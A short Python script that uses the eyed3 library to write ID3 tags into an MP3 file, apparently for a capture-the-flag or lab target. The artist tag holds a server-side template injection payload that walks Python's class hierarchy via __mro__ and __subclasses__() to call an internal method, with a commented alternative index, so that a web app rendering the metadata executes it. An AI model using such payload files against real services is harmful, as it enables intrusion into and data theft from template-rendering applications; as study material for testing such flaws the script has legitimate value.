import eyed3

audio_file = eyed3.load("eggs.mp3")
audio_file.tag.artist = (
    "{{[].__class__.__mro__[1].__subclasses__()[-39].get_details(html_con, None)}}"
)
# (
#    "{{[].__class__.__mro__[1].__subclasses__()[34].__init__.get_details()}}"
# )
audio_file.tag.title = "Makao"
audio_file.tag.genre = "Techno"
audio_file.tag.save()
